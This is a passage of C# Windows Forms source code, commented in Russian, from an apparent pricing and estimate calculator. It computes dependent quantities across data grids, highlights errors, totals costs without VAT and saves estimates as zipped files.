                                    dataGridView_зависимость.Rows[s].Cells[1].Value = dataGridView_расчёт_2.Rows[x].Cells[2].Value.ToString();
                                    err33 = false;
                                }
                            }
                        }


                    }
                    //Проблема от отсутствия строки для зависимостей
                    if (err33 == true)
                    {
                        string name_err = null;
                        try
                        {
                            name_err = dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[2].Value.ToString();
                        }
                        catch { }
                        MessageBox.Show("Нет в расчете строки:\n" + name_err, "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }


                }
            }
        }
        int techRow, techColumn, kl;
        private void dataGridView_расчёт_2_RowLeave(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        { //действие 4
            try
            {


                if (ykazat_stroki == true) { dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[techRow].Cells[techColumn]; ykazat_stroki = false; }
                timer1.Enabled = false;


                //подсветим все говницо!

                Color Yas_Color = Color.LightGreen;
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[0].Style.BackColor == Color.Wheat)
                {
                    for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
                    {
                        if (dataGridView_расчёт_2.Rows[x].Cells[2].Style.BackColor == Yas_Color)
                        { dataGridView_расчёт_2.Rows[x].Cells[2].Style.BackColor = Color.Empty; }
                    }
                    string h = null;
                    try { h = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value.ToString(); } catch { }
                    if (h != null)
                    {
                        for (int x = 0; x < dataGridView_зависимость.Rows.Count - 1; x++)
                        {
                            string s6 = null;
                            try
                            { s6 = dataGridView_зависимость.Rows[x].Cells[4].Value.ToString(); }
                            catch { }

                            if (dataGridView_зависимость.Rows[x].Cells[4].Value != null && s6 != null && s6 == h && dataGridView_зависимость.Rows[x].Cells[5].Value != null)
                            {
                                string d = null;
                                try { d = dataGridView_зависимость.Rows[x].Cells[5].Value.ToString(); } catch { }
                                if (d != null)
                                {
                                    for (int q = 0; q < dataGridView_расчёт_2.Rows.Count - 1; q++)
                                    {
                                        string s = null;
                                        try { s = dataGridView_расчёт_2.Rows[q].Cells[9].Value.ToString(); } catch { }
                                        if (s != null && s == d) { dataGridView_расчёт_2.Rows[q].Cells[2].Style.BackColor = Yas_Color; }
                                    }
                                }
                            }
                        }
                    }
                }
                else
                {
                    for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
                    {
                        if (dataGridView_расчёт_2.Rows[x].Cells[2].Style.BackColor == Yas_Color)
                        { dataGridView_расчёт_2.Rows[x].Cells[2].Style.BackColor = Color.Empty; }
                    }
                }
            }
            catch { }

        }

        private void dataGridView_муляж_CellBeginEdit(object sender, DataGridViewCellCancelEventArgs e)
        {
            //избовляемся от зависимости артикула, или числа если юзер решил сменить артикул на число

            int stolbez = dataGridView_муляж.CurrentCell.ColumnIndex;
            if (stolbez == 2)
            {
                dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[1].Value = null;
                dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[5].Value = null;
            }
            else if (stolbez == 1)
            {
                dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[2].Value = null;
                dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[5].Value = null;
            }
        }

        string Ошибка_природы = null;


        Thread поток_математики;
        private void математика_Tick(object sender, EventArgs e)
        {
            ///действие 3

            if (поток_математики == null || поток_математики.ThreadState == System.Threading.ThreadState.Stopped) {
                поток_математики = new Thread(() => математика_Tick1()); //создаем поток
            поток_математики.Start(); //запускам поток. 


            //математика_Tick1();
            //остановка математики
            if (matem_raz > 1)
            {

                matem_raz--;
            }
            else
            {
                //  поток_математики.Abort(); // останавливаем поток математики
                математика.Enabled = false;
                if (расчёт_с_математикой == true) //если была нажата кнопка "расчитать" то добавляем расчитать и подписать функцию
                {
                    расчёт_после_математики();
                    расчёт_с_математикой = false;
                }

            }


          }
        }


        private void математика_Tick1()
        {


            try
            {
                Decimal[] массив = new Decimal[dataGridView_зависимость.Rows.Count - 1];
                Boolean[] erors = new Boolean[dataGridView_зависимость.Rows.Count - 1];
                for (int s = 0; s < dataGridView_зависимость.Rows.Count - 1; s++)
                {
                    //проверка наличае 
                    try
                    {
                        if (dataGridView_зависимость.Rows[s].Cells[1].Value.ToString() == "!Выберите наименивание!") { dataGridView_зависимость.Rows[s].Cells[1].Value = null; }
                    }
                    catch { }
                    string число = null, артикул = null, знак = null, множитель = null, ID = null, ID_art = null;
                    try { число = dataGridView_зависимость.Rows[s].Cells[0].Value.ToString(); } catch { }
                    try { артикул = dataGridView_зависимость.Rows[s].Cells[1].Value.ToString(); } catch { }
                    try { знак = dataGridView_зависимость.Rows[s].Cells[2].Value.ToString(); } catch { }
                    try { множитель = dataGridView_зависимость.Rows[s].Cells[3].Value.ToString(); } catch { }
                    try { ID = dataGridView_зависимость.Rows[s].Cells[4].Value.ToString(); } catch { }
                    try { ID_art = dataGridView_зависимость.Rows[s].Cells[5].Value.ToString(); } catch { }

                    Boolean errors2 = true;
                    if (число != null && артикул == null && знак != null && множитель != null && ID != null && ID_art == null) //условие для числа
                    {
                        errors2 = false;
                        for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
                        {
                            string id_rash = null;
                            try { id_rash = dataGridView_расчёт_2.Rows[x].Cells[8].Value.ToString(); } catch { }
                            if (id_rash != null && id_rash == ID)
                            {
                                Decimal число_Decimal;
                                Boolean erorser = false;
                                bool isDecimal1 = Decimal.TryParse(число, out число_Decimal);
                                if (isDecimal1 == false)// проверка числа на число 
                                {
                                    for (int m = 0; m < dataGridView_муляж.Rows.Count - 1; m++)
                                    {
                                        try
                                        {
                                            if (dataGridView_муляж.Rows[m].Cells[1].Value.ToString() == число)
                                            {
                                                dataGridView_муляж.Rows[m].Cells[1].Style.BackColor = Color.Red;
                                                erorser = true;
                                            }
                                        }
                                        catch { }
                                    }
                                }
                                else
                                {
                                    for (int m = 0; m < dataGridView_муляж.Rows.Count - 1; m++)
                                    {
                                        try
                                        {
                                            if (dataGridView_муляж.Rows[m].Cells[1].Value.ToString() == число)
                                            {
                                                dataGridView_муляж.Rows[m].Cells[1].Style.BackColor = Color.Empty;
                                                erorser = false;
                                            }
                                        }
                                        catch { }
                                    }
                                }
                                Decimal множитель_Decimal;
                                bool isDecimal2 = Decimal.TryParse(множитель, out множитель_Decimal);
                                if (isDecimal2 == false)// проверка числа на число 
                                {
                                    for (int m = 0; m < dataGridView_муляж.Rows.Count - 1; m++)
                                    {
                                        try
                                        {
                                            if (dataGridView_муляж.Rows[m].Cells[4].Value.ToString() == множитель)
                                            {
                                                dataGridView_муляж.Rows[m].Cells[4].Style.BackColor = Color.Red;
                                                erorser = true;
                                            }
                                        }
                                        catch { }
                                    }
                                }
                                else
                                {
                                    for (int m = 0; m < dataGridView_муляж.Rows.Count - 1; m++)
                                    {
                                        try
                                        {
                                            if (dataGridView_муляж.Rows[m].Cells[4].Value.ToString() == множитель)
                                            {
                                                dataGridView_муляж.Rows[m].Cells[4].Style.BackColor = Color.Empty;
                                                erorser = false;
                                            }
                                        }
                                        catch { }
                                    }
                                }

                                if (isDecimal1 == false || isDecimal2 == false) { erorser = true; }
                                Decimal результат = 0;
                                if (знак == "/")
                                { try { результат = число_Decimal / множитель_Decimal; } catch { erorser = true; } }
                                if (знак == "x")
                                { try { результат = число_Decimal * множитель_Decimal; } catch { erorser = true; } }
                                if (знак == "+")
                                { try { результат = число_Decimal + множитель_Decimal; } catch { erorser = true; } }
                                if (знак == "-")
                                { try { результат = число_Decimal - множитель_Decimal; } catch { erorser = true; } }

                                массив[s] = результат;
                                erors[s] = erorser;
                            }
                        }
                    }



                    if (число == null && артикул != null && знак != null && множитель != null && ID != null && ID_art != null) //условие для артикула
                    {
                        errors2 = false;

                        Decimal kol = 0;
                        Boolean erorser = false;
                        for (int z = 0; z < dataGridView_расчёт_2.Rows.Count - 1; z++)
                        {
                            string id_art = null;
                            try { id_art = dataGridView_расчёт_2.Rows[z].Cells[9].Value.ToString(); } catch { }
                            if (id_art != null && id_art == ID_art)
                            {
                                try
                                {
                                    bool isDecimal6 = Decimal.TryParse(dataGridView_расчёт_2.Rows[z].Cells[6].Value.ToString(), out kol);
                                    if (isDecimal6 == false) { erorser = true; }
                                }
                                catch { erorser = true; dataGridView_расчёт_2.Rows[z].Cells[6].Value = "Сколько?"; }
                            }

                        }
                        Decimal результат = 0;
                        Decimal множитель_Decimal;
                        bool isDecimal2 = Decimal.TryParse(множитель, out множитель_Decimal);
                        if (isDecimal2 == false)// проверка числа на число 
                        {
                            for (int m = 0; m < dataGridView_муляж.Rows.Count - 1; m++)
                            {
                                try
                                {
                                    if (dataGridView_муляж.Rows[m].Cells[4].Value.ToString() == множитель)
                                    {
                                        dataGridView_муляж.Rows[m].Cells[4].Style.BackColor = Color.Red;
                                    }
                                }
                                catch { }
                            }
                        }
                        else
                        {
                            for (int m = 0; m < dataGridView_муляж.Rows.Count - 1; m++)
                            {
                                try
                                {
                                    if (dataGridView_муляж.Rows[m].Cells[4].Value.ToString() == множитель)
                                    {
                                        dataGridView_муляж.Rows[m].Cells[4].Style.BackColor = Color.Empty;
                                    }
                                }
                                catch { }
                            }
                        }
                        if (erorser == false && isDecimal2 == false) { erorser = true; }
                        if (знак == "/" && kol != 0) { try { результат = kol / множитель_Decimal; } catch { erorser = true; } }
                        if (знак == "x" && kol != 0) { try { результат = kol * множитель_Decimal; } catch { erorser = true; } }
                        if (знак == "+" && kol != 0) { try { результат = kol + множитель_Decimal; } catch { erorser = true; } }
                        if (знак == "-" && kol != 0) { try { результат = kol - множитель_Decimal; } catch { erorser = true; } }


                        массив[s] = результат;
                        erors[s] = erorser;
                    }

                    if (errors2 == true)
                    {
                        массив[s] = 0;
                        erors[s] = true;
                    }
                }
                for (int f = 0; f < dataGridView_расчёт_2.Rows.Count - 1; f++)
                {
                    if (dataGridView_расчёт_2.Rows[f].Cells[6].Style.BackColor == Color.Red)
                    {
                        dataGridView_расчёт_2.Rows[f].Cells[6].Style.BackColor = Color.Empty;
                    }

                    try
                    {
                        if (dataGridView_расчёт_2.Rows[f].Cells[6].Value.ToString() == "Сколько?")
                        {
                            dataGridView_расчёт_2.Rows[f].Cells[6].Style.BackColor = Color.Red;
                        }
                    }
                    catch { }
                }
                int col_errors = 0;
                for (int f = 0; f < erors.Length; f++)
                {
                    if (erors[f] == true)
                    {
                        col_errors++;
                    }
                }
                string[] col_errors_id = new string[col_errors];
                int col_errors1 = 0;
                for (int f = 0; f < erors.Length; f++)
                {
                    if (erors[f] == true)
                    {
                        try { col_errors_id[col_errors1] = dataGridView_зависимость.Rows[f].Cells[4].Value.ToString(); } catch { }
                        col_errors1++;
                    }
                }
                for (int x = 0; x < col_errors; x++)
                {
                    for (int f = 0; f < dataGridView_расчёт_2.Rows.Count - 1; f++)
                    {
                        try
                        {
                            if (col_errors_id[x] == dataGridView_расчёт_2.Rows[f].Cells[8].Value.ToString())
                            {
                                dataGridView_расчёт_2.Rows[f].Cells[6].Style.BackColor = Color.Red;
                            }
                        }
                        catch { }
                    }
                }
                string kol_ID = null;
                int kol_id = 0;
                for (int s = 0; s < dataGridView_зависимость.Rows.Count - 1; s++)
                {
                    string kol_ID1 = null;
                    try { kol_ID1 = dataGridView_зависимость.Rows[s].Cells[4].Value.ToString(); } catch { }
                    if (kol_ID != kol_ID1) { kol_ID = kol_ID1; kol_id++; }
                }
                string[] id_mas = new string[kol_id];
                string kol_ID11 = null;
                int t = 0;
                for (int s = 0; s < dataGridView_зависимость.Rows.Count - 1; s++)
                {
                    string kol_ID111 = null;
                    try { kol_ID111 = dataGridView_зависимость.Rows[s].Cells[4].Value.ToString(); } catch { }
                    if (kol_ID11 != kol_ID111) { kol_ID11 = kol_ID111; id_mas[t] = kol_ID111; t++; }
                }
                for (int s = 0; s < kol_id; s++)
                {
                    Decimal rez = 0;
                    for (int f = 0; f < dataGridView_зависимость.Rows.Count - 1; f++)
                    {
                        if (id_mas[s] == dataGridView_зависимость.Rows[f].Cells[4].Value.ToString())
                        {
                            rez = rez + массив[f];


                            if (Ошибка_природы != null)
                            {

                                for (int i = 0; i < dataGridView_расчёт_2.Rows.Count - 1; i++)
                                {
                                    string rt = null;
                                    try { rt = dataGridView_расчёт_2.Rows[i].Cells[8].Value.ToString(); } catch { }

                                    if (rt == Ошибка_природы) { dataGridView_расчёт_2.Rows[i].Cells[0].Style.BackColor = Color.Wheat; }


                                }


                                Ошибка_природы = null;
                            }

                            if (массив[f] == 0)
                            {
                                string re = null;
                                string re2 = null;
                                try
                                {
                                    re = dataGridView_зависимость.Rows[f].Cells[1].Value.ToString();
                                }
                                catch { }
                                try
                                {
                                    re2 = dataGridView_зависимость.Rows[f].Cells[4].Value.ToString();
                                }
                                catch { }


                                label_consol_2.Text = "Проблема c зависимостью в строке:" + re;

                                for (int i = 0; i < dataGridView_расчёт_2.Rows.Count - 1; i++)
                                {
                                    string fdf = null;
                                    try { fdf = dataGridView_расчёт_2.Rows[i].Cells[8].Value.ToString(); } catch { }
                                    if (fdf != null && fdf == re2)
                                    {
                                        dataGridView_расчёт_2.Rows[i].Cells[0].Style.BackColor = Color.Red;
                                        Ошибка_природы = dataGridView_расчёт_2.Rows[i].Cells[8].Value.ToString();
                                    }
                                }

                            }
                        }
                    }
                    for (int f = 0; f < dataGridView_расчёт_2.Rows.Count - 1; f++)
                    {
                        string id_art = null;
                        try { id_art = dataGridView_расчёт_2.Rows[f].Cells[8].Value.ToString(); } catch { }
                        if (id_art == id_mas[s])
                        {

                            if (rez % 1 == 0)
                            {
                                dataGridView_расчёт_2.Rows[f].Cells[6].Value = rez.ToString();
                            }
                            else { dataGridView_расчёт_2.Rows[f].Cells[6].Value = rez.ToString("########.00"); }
                        }
                    }
                }

            }
            catch { }



        }

        private void duble_art_art_Tick(object sender, EventArgs e)
        {
            duble_art_art.Enabled = false;
        }



        int xaxa_121 = 0;    
        private void сохранитьКакToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (label_rachetka.Text != "Расчетка: Новая")
            {
                otclehivat_polzovatelia = false;
                label_consol_2.Text = "Попытка сохранить данные с таблицы.. :)";
                if (dataGridView_расчёт_2.NewRowIndex == 0)
                {
                    if (xaxa_121 == 0) { label_consol_2.Text = "Серьёзно? Нечего сохранять!!"; xaxa_121++; } else { xaxa_121++; label_consol_2.Text = "Оцепись от этой кнопки!!!"; if (xaxa_121 > 2) { xaxa_121 = 0; } }
                }
                else
                {
                    if (dataGridView_расчёт_2.NewRowIndex == 1) { label_consol_2.Text = "Запомни в уме! :) Запиши на листик!"; }
                    else
                    {
                        string FileName2 = label_rachetka.Text;
                        char[] MyChar2 = { 'Р', 'а', 'с', 'ч', 'е', 'т', 'к', 'а', ':' };
                        string Directory2 = FileName2.TrimStart(MyChar2);
                        string TEMP = Path.GetTempPath();
                        // Directory.Delete(TEMP + @"\1", true);
                        //File.Copy(@"D:\q.bmp", TEMP + @"\q.bmp", true );
                        try
                        {
                            // получаем выбранный файл
                            string filename = Directory2;
                            System.IO.FileInfo obj = new System.IO.FileInfo(Directory2); // получаем имя
                            ActiveForm.Text = obj.Name; //  obj.Name - это имя файла
                            int y = filename.Length - 4;
                            string Directory1 = filename.Remove(y, 4); // путь к папке
                            Directory1 = Directory1.Remove(0, 1);
                            System.IO.Directory.CreateDirectory(Directory1); // создаем папку! с именем файла
                            string name_file = System.IO.Path.GetFileNameWithoutExtension(filename);// имя файла без пути! 
                            string name_file_put = Directory1 + "\\" + obj.Name;
                            string name_file_zav = Directory1 + "\\_" + obj.Name;
                            //Примечание
                            string name_file_PS = Directory1 + "\\_PS_" + obj.Name;
                            try
                            {
                                FileStream fileStream = File.Open(name_file_PS, FileMode.Create);
                                StreamWriter output = new StreamWriter(fileStream);
                                if (textBox_P_S.Text != null && textBox_P_S.Text != "")
                                { output.Write(textBox_P_S.Text); }
                                else { output.Write(""); }
                                output.Close();
                            }
                            catch { }
                            //2)сохраняем основные данные
                            using (BinaryWriter bw = new BinaryWriter(File.Open(name_file_put, FileMode.Create)))
                            {
                                bw.Write(dataGridView_расчёт_2.Columns.Count);
                                bw.Write(dataGridView_расчёт_2.Rows.Count);
                                foreach (DataGridViewRow dgvR in dataGridView_расчёт_2.Rows)
                                {
                                    for (int j = 0; j < dataGridView_расчёт_2.Columns.Count; ++j)
                                    {
                                        object val = dgvR.Cells[j].Value;
                                        if (val == null)
                                        {
                                            bw.Write(false);
                                            bw.Write(false);
                                        }
                                        else
                                        {
                                            bw.Write(true);
                                            bw.Write(val.ToString()); //bw.Write(val.ToString());
                                            if (val.ToString() != "System.Drawing.Bitmap") //если текст
                                            {
                                                Bitmap img = dataGridView_расчёт_2.Rows[dgvR.Index].Cells[4].Value as Bitmap;
                                                if (img != null)
                                                {
                                                    if (dataGridView_расчёт_2.NewRowIndex != dgvR.Index)
                                                    {
                                                        PictureBox asa = new PictureBox();
                                                        asa.Image = img;
                                                        try { asa.Image.Save(Directory1 + "\\" + dgvR.Index.ToString() + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg); } catch { }
                                                    }
                                                    else
                                                    {
                                                        if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[0].Value == null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[1].Value == null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[2].Value == null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[3].Value == null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[5].Value == null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[6].Value != null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[7].Value != null
                                                          )
                                                        {
                                                        }
                                                        else
                                                        {
                                                            PictureBox asa = new PictureBox();
                                                            asa.Image = img;
                                                            asa.Image.Save(Directory1 + "\\" + dgvR.Index.ToString() + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            //2)сохраняем файл зависимостей.
                            //////////////////////////
                            using (BinaryWriter bw = new BinaryWriter(File.Open(name_file_zav, FileMode.Create)))
                            {
                                bw.Write(dataGridView_зависимость.Columns.Count);
                                bw.Write(dataGridView_зависимость.Rows.Count);
                                foreach (DataGridViewRow dgvR in dataGridView_зависимость.Rows)
                                {
                                    for (int j = 0; j < dataGridView_зависимость.Columns.Count; ++j)
                                    {
                                        object val = dgvR.Cells[j].Value;
                                        if (val == null)
                                        {
                                            bw.Write(false);
                                            bw.Write(false);
                                        }
                                        else
                                        {
                                            bw.Write(true);

                                            switch (val.ToString())
                                            {
                                                case ("+"):
                                                    bw.Write("+");
                                                    break;
                                                case ("-"):
                                                    bw.Write("-");
                                                    break;
                                                case ("/"):
                                                    bw.Write("/");
                                                    break;
                                                case ("х"):
                                                    bw.Write("x");
                                                    break;
                                                default:
                                                    bw.Write(val.ToString());
                                                    break;
                                            }
                                        }
                                    }
                                }
                            }
                            /////////////////
                            //3) архивация данных
                            using (ZipFile zip = new ZipFile(Encoding.GetEncoding(866)))
                            {
                                string zzz = Directory1;
                                char[] charArr = (name_file + ".DAH").ToCharArray();
                                string ddd = filename.TrimEnd(charArr);
                                string aaa = Directory1 + "\\" + name_file + ".DAH";
                                zip.AddDirectory(@Directory1, name_file);
                                zip.Save(@ddd + name_file + ".DAH");
                                try { Directory.Delete(@Directory1, true); } catch { MessageBox.Show("Я все сделала! НО Рядом с файлом создала временную папку с таким же именем ! Удали её в ручную! Без обид! Так получилось"); }
                            }
                            label_consol_2.Text = "Файл расчетки сохранен и находится:" + Directory2;
                            // MessageBox.Show("Файл сохранен");  
                        }
                        catch
                        {
                            DialogResult rezult = MessageBox.Show("Невозможно сохранить файл сюда",
                            "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            label_consol_2.Text = "Не смертельна, может нет доступа к папке, или не от админа сидим тут";
                        }
                        this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;
                        //запоминаем колличество и цену! 
                        decimal цена = 0;
                        int koll = 0;
                        for (int i = 0; i < dataGridView_расчёт_2.NewRowIndex; i++)
                        {
                            try
                            {
                                decimal fr = 0;
                                bool isDecimal1 = Decimal.TryParse(dataGridView_расчёт_2.Rows[i].Cells[7].Value.ToString(), out fr);
                                if (isDecimal1 == true) { цена = цена + fr; }
                            }
                            catch { }
                            try
                            {
                                int r = Convert.ToInt16(dataGridView_расчёт_2.Rows[i].Cells[6].Value.ToString());
                                koll = koll + r;
                            }
                            catch { }
                        }
                        has_the_price_changed = цена;
                        has_the_calculation_of_the_quantity_changed = koll;
                    }
                }
                otclehivat_polzovatelia = true;
                string FileName3 = label_rachetka.Text;
                char[] MyChar3 = { 'Р', 'а', 'с', 'ч', 'е', 'т', 'к', 'а', ':' };
                string Directory3 = FileName3.TrimStart(MyChar3);
                Save_history_user_work("Я изменил шаблон:"+ @Directory3, Directory3);

            }
            else
            {
                сохранитьРасчетToolStripMenuItem.PerformClick();
            }
        }

        private void загрузитьБазуЗаногоБезСохраненийToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                this.tableTableAdapter.Fill(this.данные.Table);
                label_consol.Text = "Заново слил с базы.";
            }
            catch
            {
                DialogResult rezult = MessageBox.Show("Немогу подключится к базе!!! \n Возможно: нет базы, выкл. OpenVPN, \n что то пошло не так, \n забыл установить SqlLocalDB! \n Проверь все и перезапусти программу! \n\n У тебя должен быть свободный доступ к: \n \\172.16.10.1\\техотдел\\baza\\baza.mdf",
                "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                label_consol.Text = "Отвалилась связь с базой";
            }
        }

        bool button_del_razhet_sobit = false;
        private void button_del_razhet_end_Click(object sender, EventArgs e)
        {
            button_del_razhet_sobit = true;   //...button_del_razhet_sobit==true  button_del_razhet_funktia()
            сохранить_для_востоновления();
        }
        void button_del_razhet_funktia()
        {
            if (dataGridView_расчёт_2.Rows.Count <= 1) { label_consol_2.Text = "нечего удалять"; button_del_razhet_sobit = false; return; }
            // Удалить строку
            int nr, nc;
            nc = dataGridView_расчёт_2.Columns.Count; // количество столбцов
            nr = dataGridView_расчёт_2.RowCount;// количество строк
            //удаляем зависимость
            int ad = dataGridView_расчёт_2.RowCount - 2;
            if (dataGridView_расчёт_2.Rows[ad].Cells[8].Value != null)
            {
                string id = dataGridView_расчёт_2.Rows[ad].Cells[8].Value.ToString();
                for (int a = dataGridView_зависимость.Rows.Count - 1; a >= 0; a--)
                {
                    try
                    {
                        if (dataGridView_зависимость.Rows[a].Cells[4].Value.ToString() == id)
                        {
                            dataGridView_зависимость.Rows.RemoveAt(a);
                        }
                    }
                    catch { }
                }
            }
            if ((nc > 0) && (nr > 1))
            {
                dataGridView_расчёт_2.Rows.RemoveAt(nr - 2); // удалить первую строку  dataGridView1.Rows.RemoveAt(0); // удалить первую строку
                label_consol_2.Text = "Удалена последняя строка" + "         Всего строк: " + dataGridView_расчёт_2.NewRowIndex.ToString();
                razhet_label.Visible = true;//требуется расчёт
            }
            else
            {
                label_consol_2.Text = "Нечего удалять.";
            }
            button_del_razhet_sobit = false;
        }
        bool была_нажата_расёт_и_цена_или_просто_расёт = false;
        bool расчёт_с_математикой = false;
        private void button_расчитать_Click(object sender, EventArgs e)

        {
            была_нажата_расёт_и_цена_или_просто_расёт = false;
            // проверка на неудаленные зависимости. Типо страку грохнули, в таблице осталось
            string b = null; //в эту страку поместим все левые строки в зависимостях( условно ошибки)
            for (int i = 0; i < dataGridView_зависимость.Rows.Count - 1; i++) // запустим цикл обьемом с 
            {
                try
                {
                    string g = dataGridView_зависимость.Rows[i].Cells[4].Value.ToString();
                    bool y = false;
                    for (int r = 0; r < dataGridView_расчёт_2.Rows.Count - 1; r++)
                    {
                        string f = null;
                        try { f = dataGridView_расчёт_2.Rows[r].Cells[8].Value.ToString(); } catch { }
                        if (f == g)
                        {
                            y = true;
                            r = dataGridView_расчёт_2.Rows.Count;
                        }
                    }
                    if (y == false)
                    {
                        if (b == null) { b = i.ToString(); } else { b = b + " " + i.ToString(); }
                    }
                }
                catch { }
            }

            if (b != null)
            {
                string[] words = b.Split(new char[] { ' ' }); //делим строку с списками ошибок
                for (int i = words.Length; i >= 1; i--)
                {
                    int h = Int32.Parse(words[i - 1]);
                    dataGridView_зависимость.Rows.RemoveAt(h);
                }
            }

            //узнаем сколько раз надо посчитать!
            matem_raz = 0;

            if (dataGridView_зависимость.Rows.Count > 0)
            {
                for (int i = 0; i < dataGridView_зависимость.Rows.Count; i++)
                {
                    string l = null;
                    try
                    {
                        l = dataGridView_зависимость.Rows[i].Cells[5].Value.ToString();
                        matem_raz++;
                    }
                    catch { }
                }

            }


            //запускаем математику

            математика.Enabled = true;// посчитаем 
            timer1.Enabled = true; // эта херня возращает назад к нужной строке при смене зависимости артикула
            расчёт_с_математикой = true; //разрешаем собственно сам расчёт.




        }

        private void расчёт_после_математики()
        {
            if (dataGridView_расчёт_2.NewRowIndex == 0) { label_consol_2.Text = "Нечего считать!"; return; }
            dialog_mess("Start");
            label_consol_2.Text = "Считаю. Подожди...";



            // закрасим все белым, типо нет ошибок
            for (int q = 0; q <= dataGridView_расчёт_2.NewRowIndex; q++)
            {
                dialog_mess("Очистка:" + ((q * 100) / dataGridView_расчёт_2.NewRowIndex).ToString());
                string е5 = null;
                string е6 = null;
                string е7 = null;
                try
                {
                    е5 = dataGridView_расчёт_2.Rows[q].Cells[5].Value.ToString();
                }
                catch { }
                try
                {
                    е6 = dataGridView_расчёт_2.Rows[q].Cells[6].Value.ToString();
                }
                catch { }
                try
                {
                    е7 = dataGridView_расчёт_2.Rows[q].Cells[7].Value.ToString();
                }
                catch { }
                if (е6 != null && е7 != null)
                {
                    for (int w = 1; w < 8; w++)
                    {
                        if (no_color_w == false) { dataGridView_расчёт_2[w, q].Style.BackColor = Color.Empty; }
                    }

                }




            }



            //пробежимся по всем посчитаем

            int chet = 1;
            Decimal itogo = 0;
            for (int q = 0; q < dataGridView_расчёт_2.NewRowIndex; q++)
            {
                dialog_mess("Cуммирование:" + ((q * 100) / dataGridView_расчёт_2.NewRowIndex).ToString());
                if (dataGridView_расчёт_2.Rows[q].Cells[5].Value == null && dataGridView_расчёт_2.Rows[q].Cells[6].Value != null) { dataGridView_расчёт_2.Rows[q].Cells[5].Value = "заблыл вписать!"; }
                if (dataGridView_расчёт_2.Rows[q].Cells[6].Value == null && dataGridView_расчёт_2.Rows[q].Cells[5].Value != null) { dataGridView_расчёт_2.Rows[q].Cells[6].Value = "заблыл вписать!"; }




                if (dataGridView_расчёт_2.Rows[q].Cells[5].Value != null && dataGridView_расчёт_2.Rows[q].Cells[6].Value != null)

                {//если внутри нас нормаляная расчетка с указанным колличеством то

                    //задодим номер строчке
                    dataGridView_расчёт_2.Rows[q].Cells[0].Value = chet.ToString(); chet++;


                    //колличество + посчитать сумарно+вывести в последнюю
                    ///считаем сумму в каждой
                    decimal newDecimal;

                    bool isDecimal = Decimal.TryParse(dataGridView_расчёт_2.Rows[q].Cells[5].Value.ToString(), out newDecimal);
                    decimal newDecimal1;

                    bool isDecimal1 = Decimal.TryParse(dataGridView_расчёт_2.Rows[q].Cells[6].Value.ToString(), out newDecimal1);
                    string twoDecimalPlaces = (newDecimal * newDecimal1).ToString("########.00");
                    if (newDecimal * newDecimal1 < 1) { twoDecimalPlaces = "0" + twoDecimalPlaces; }
                    dataGridView_расчёт_2.Rows[q].Cells[7].Value = twoDecimalPlaces;

                    //сложем с числом выше для подсчета итого
                    itogo = itogo + (newDecimal * newDecimal1);

                    //если это конец (последний раз крутим цикл)то добавим это итого под новой строчкой
                    if (q == dataGridView_расчёт_2.NewRowIndex - 1)
                    {
                        dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[6].Value = "Итого без НДС:";

                        string итогоs = itogo.ToString("########.00");
                        if (itogo < 1) { итогоs = "0" + итогоs; }
                        dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[7].Value = itogo;

                    }



                }
                else
                {// если нет то скорей всего это заглавие. И буудем работать с ним
                    if (dataGridView_расчёт_2.Rows[q].Cells[1].Value != null && dataGridView_расчёт_2.Rows[q].Cells[2].Value == null) { dataGridView_расчёт_2.Rows[q].Cells[0].Value = ""; }
                    if (dataGridView_расчёт_2.Rows[q].Cells[1].Value == null && dataGridView_расчёт_2.Rows[q].Cells[2].Value != null) { dataGridView_расчёт_2.Rows[q].Cells[0].Value = ""; }
                }

                if (itogo == 0)
                {
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[6].Value = "Итого без НДС:";
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[7].Value = itogo;
                }

            }


            // закрасим все красным те строки в которых итоговая цена получилася 0.00
            int ohibki = 0;
            string ohibki_text = "";
            for (int q = 0; q <= dataGridView_расчёт_2.NewRowIndex; q++)
            {
                dialog_mess("Ошибки1?:" + ((q * 100) / dataGridView_расчёт_2.NewRowIndex).ToString());
                if (dataGridView_расчёт_2.Rows[q].Cells[7].Value != null)
                {
                    if (dataGridView_расчёт_2.Rows[q].Cells[7].Value.ToString() == "0,00")
                    {
